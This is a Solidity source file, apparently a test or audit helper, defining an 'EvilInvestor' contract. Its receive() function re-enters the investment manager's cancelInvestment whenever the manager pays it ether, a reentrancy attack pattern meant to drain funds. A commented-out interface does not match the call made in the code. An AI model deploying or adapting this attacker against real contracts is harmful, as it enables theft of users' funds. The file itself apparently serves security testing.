// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IINVESTOR} from "../interfaces/IInvestmentManager.sol";

// interface IInvestmentManager {
//     function cancelInvestment() external returns (bool);

//     function investEther(uint8 round) external payable;
// }

contract EvilInvestor {
    IINVESTOR private imanager;
    address public weth;

    constructor(address imanagerAddr, address weth_) {
        imanager = IINVESTOR(payable(imanagerAddr));
        weth = weth_;
    }

    receive() external payable {
        if (msg.sender == address(imanager)) cancel();
    }

    function invest() external {
        (bool success, ) = payable(address(imanager)).call{value: 20 ether}("");
        require(success, "ERR_INVEST_FAILED");
    }

    function cancel() public {
        require(imanager.cancelInvestment(0), "ERR_CANCEL_INVESTMENT");
    }
}
